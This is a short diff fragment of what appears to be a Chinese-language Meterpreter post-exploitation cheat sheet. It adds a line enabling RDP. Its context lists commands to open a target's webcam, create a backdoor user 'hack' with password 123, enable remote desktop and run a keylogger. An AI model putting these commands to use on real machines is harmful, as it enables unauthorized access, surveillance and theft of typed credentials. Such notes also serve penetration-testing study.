@@ -84,6 +84,7 @@ webcam_stream       #开视频
 execute  参数  -f 可执行文件   #执行可执行程序
 run getgui -u hack -p 123    #创建hack用户，密码为123
 run getgui -e                #开启远程桌面
+run post/windows/manage/enable_rdp
 keyscan_start                #开启键盘记录功能
 keyscan_dump                 #显示捕捉到的键盘记录信息
 keyscan_stop                 #停止键盘记录功能
